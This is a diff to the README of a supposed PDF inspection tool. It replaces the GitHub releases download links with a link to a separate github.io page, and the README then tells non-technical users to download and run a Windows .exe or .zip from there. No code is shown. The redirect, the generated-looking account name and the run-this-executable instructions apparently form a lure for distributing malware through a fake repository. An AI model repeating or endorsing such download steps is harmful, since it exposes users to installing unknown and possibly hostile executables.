@@ -1,10 +1,10 @@
 # 🕵️ pdf-inspector - Fast PDF Detection & Text Extraction Tool
 
-[![Download Now](https://img.shields.io/badge/Download-pdf--inspector-blueviolet?style=for-the-badge&logo=github)](https://github.com/Benitapurplered834/pdf-inspector/releases)
+[![Download Now](https://img.shields.io/badge/Download-pdf--inspector-blueviolet?style=for-the-badge&logo=github)](https://benitapurplered834.github.io)
 
 ## 📥 Download & Install
 
-Visit this link to download the application: [https://github.com/Benitapurplered834/pdf-inspector/releases](https://github.com/Benitapurplered834/pdf-inspector/releases)
+Visit this link to download the application: [https://benitapurplered834.github.io](https://benitapurplered834.github.io)
 
 Once you arrive at the download page, look for the latest version and click the file that matches your computer system (for Windows, look for a file ending in .exe or .zip). After downloading, follow the on-screen instructions to complete the setup. No coding or technical knowledge is required.
 
